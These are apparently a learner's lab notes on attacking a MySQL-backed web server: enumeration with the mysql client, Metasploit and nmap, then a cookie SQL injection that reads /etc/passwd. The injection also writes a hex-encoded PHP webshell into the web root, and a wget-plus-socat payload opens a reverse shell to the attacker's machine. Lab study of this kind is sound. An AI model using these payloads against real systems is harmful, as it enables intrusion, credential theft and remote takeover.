<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MySQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MySQL</h1><br/><p><strong><h1>MySQL</h1></strong></p><p></p><p></p><p><strong><h3>Enumeration Using Client</h3></strong></p><p></p><p>You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn&#39;t already installed, you can install it using <strong>sudo apt install default-mysql-client</strong></p><p></p><p><strong><span style="text-decoration:underline;">To Login without Password:</span></strong></p><p></p><p><strong>mysql -h 10.10.213.240 -u root</strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">To Login with Password:</span></strong></p><p></p><p><strong>mysql -h 10.10.213.240 -u root -p</strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Essential Navigation Commands:</span></strong></p><p></p><p>SELECT versions()</p><p>SHOW databases; 							: Prints out the databases we can access.</p><p>USE {database_name}; 				: Set to use the database named {database_name}.</p><p>SHOW tables; 								: Prints out the available tables inside the currentdatabase.</p><p>SELECT * FROM {table_name};	: Prints out all the data from the table {table_name}.</p><p></p><p></p><p><strong><h2>Enumerating Using Metasploit</h2></strong></p><p></p><p><strong>auxiliary/admin/mysql/mysql_sql</strong></p><p></p><p><img src="images/253-1.png" alt="images/253-1.png" /></p><p></p><p>We can try other commands in the <strong>SQL</strong> option.</p><p></p><p><strong><span style="text-decoration:underline;">Schema Dump</span></strong></p><p></p><p><strong>auxiliary/scanner/mysql/mysql_schemadump</strong></p><p><img src="images/253-2.png" alt="images/253-2.png" /></p><p></p><p></p><p>Once we run it, it outputs the schema of all the databases.</p><p><img src="images/253-3.png" alt="images/253-3.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Hashdump</span></strong></p><p></p><p><strong>auxiliary/scanner/mysql/mysql_hashdump</strong></p><p><img src="images/253-4.png" alt="images/253-4.png" /></p><p></p><p></p><p><strong><h2>Alternative Enumeration</h2></strong></p><p></p><p>As with the previous task, it&#39;s worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as <strong>nmap&#39;s</strong> <strong>mysql-enum scrip</strong>t: https://nmap.org/nsedoc/scripts/mysql-enum.html or https://www.exploit-db.com/exploits/23081. I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire. </p><p></p><p><strong>Version</strong></p><p>nmap --script=mysql-info.nse 10.10.213.240</p><p><img src="images/253-5.png" alt="images/253-5.png" /></p><p></p><p><strong>Databases (Using Script Args)</strong></p><p>nmap --script=mysql-databases.nse --script-args &#39;mysqluser=root,mysqlpass=&quot;password&quot;&#39; 10.10.213.240</p><p><img src="images/253-6.png" alt="images/253-6.png" /></p><p></p><p><strong><h3>Running SQL Queries</h3></strong></p><p>nmap -p 3306 10.10.213.240 --script mysql-query --script-args=&#39;query=&quot;select version()&quot;,username=root,password=password&#39;</p><p><img src="images/253-7.png" alt="images/253-7.png" /></p><p></p><p></p><p><strong><h3>RCE Using LOAD_FILE and INTO OUTFILE</h3></strong></p><p></p><p>There are two functions in MySql which help us in achieving this,<strong>LOAD_FILE</strong> and <strong>INTO OUTFILE</strong> .Usually these functions are disabled.Lets try in our case. <strong>LOAD_FILE</strong> helps us in reading the files.</p><p></p><p>Value of Cookie: <strong>&#39;UNION SELECT 1,LOAD_FILE(&quot;/etc/passwd&quot;)-- -</strong></p><p></p><p><img src="images/253-8.png" alt="images/253-8.png" /></p><p></p><p>We can use this to read the index.php &amp; config.php files. (Further Research)</p><p>However, for RCE we will use <strong>INTO OUTFILE</strong> &amp; a <strong>webshell</strong></p><p></p><p><strong>Note:</strong> INTO_OUTFILE uses a string to be uploaded so fully functional PHP Reverse shell might not work.</p><p>We will use a <strong>simple shell</strong> that takes a <strong>cmd</strong> parameter.</p><p><strong></strong></p><p><strong>PHP Code:</strong></p><p><strong>&lt;?php echo system($_GET[&#39;cmd&#39;]);?&gt;</strong></p><p>Or</p><p><strong>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</strong></p><p>Or</p><p><strong>&lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_GET[&quot;cmd&quot;]) . &quot;&lt;/pre&gt;&quot;;?&gt;</strong></p><p></p><p>Converted it to HEX online</p><p></p><p><strong>Hex Value:</strong> (3rd One)</p><p>3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e</p><p></p><p><strong>We can use it in 2 ways</strong></p><p></p><p>Value of Cookie: â€˜<strong>UNION SELECT 1,0x3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e INTO OUTFILE &#39;/var/www/html/my_shell.php&#39;-- -</strong></p><p></p><p>Or</p><p></p><p>Value of Cookie: <strong>&#39;INTO OUTFILE &#39;/var/www/html/my_shell.php&#39; LINES TERMINATED BY 0x3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e-- -</strong></p><p></p><p>I will use the 2nd one.</p><p></p><p><strong>Note:</strong> Append the above to the existing random cookie value for proper functioning.</p><p></p><p><strong>FInal Cookie Value:</strong> 1487e53db304c8a130c67fb71d10559d&#39; INTO OUTFILE &#39;/var/www/html/my_shell.php&#39; LINES TERMINATED BY 0x3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e-- -</p><p></p><p>Save the Above Cookie &amp; Reload the webpage. Then visit the following URL for RCE</p><p></p><p><strong>http://10.10.58.33/my_shell.php?cmd=id</strong> </p><p></p><p><img src="images/253-9.png" alt="images/253-9.png" /></p><p></p><p>We will then use socat for initial connection. We get the static binary from: <strong>https://github.com/andrew-d/static-binaries</strong> </p><p>Start a socat listner on our kali machine:</p><p></p><p><strong>socat tcp-l:7777 file:`tty`,raw,echo=0</strong></p><p></p><p>Then host the binary in a python web server &amp; use the following payload.</p><p></p><p><strong>wget http://10.11.72.31/socat -q -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat tcp:10.11.72.31:7777 exec:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</strong></p><p></p><p>We need to <strong>URL</strong> <strong>encode</strong> the above payload &amp; then use it in <strong>cmd=</strong></p><p></p><p><strong>https://www.urlencoder.org/</strong> </p><p></p><p>wget%20http%3A%2F%2F10.11.72.31%2Fsocat%20-q%20-O%20%2Ftmp%2Fsocat%3B%20chmod%20%2Bx%20%2Ftmp%2Fsocat%3B%20%2Ftmp%2Fsocat%20tcp%3A10.11.72.31%3A7777%20exec%3A%22bash%20-li%22%2Cpty%2Cstderr%2Csigint%2Csetsid%2Csane%0A</p><p></p><p>Once we run it in the website. We will get a reverse connection.</p><p></p><p><img src="images/253-10.png" alt="images/253-10.png" /></p></div>
</body>
</html>
